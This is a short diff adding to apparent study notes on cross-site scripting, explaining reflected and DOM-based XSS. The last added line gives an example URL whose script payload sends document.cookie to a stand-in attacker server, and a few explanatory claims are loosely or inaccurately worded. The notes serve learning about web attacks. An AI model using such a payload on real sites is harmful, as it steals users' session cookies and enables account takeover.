@@ -12,3 +12,10 @@
  * Reflected XSS - user input is returned without being stored in a database. Often found in input forms that build pages, like search boxes.
      * https://example.com/search?q=<script> ... </script>
      * Not only could they extract data, but **perform malicious actions on the victim's machine on behalf of the attacker**.
+ * DOM-based XSS - similar to a reflected XSS except it doesnt leave the browser. Scripts injected stay on the browser and targets the DOM of a web page.
+     * DOM specifies how HTML creates a webpage and how scripts modify it.
+     * Targets local files saved on the browser.
+     * jQuery alters the DOM is often vulnerable to these type of attacks.
+     * Can be embedded in fragments and URL parameters:
+         * https://example.com#about_us
+         * https://example.com?locale=<script>location='http://attacker_server_ip/?c=+document.cookie;</script> 
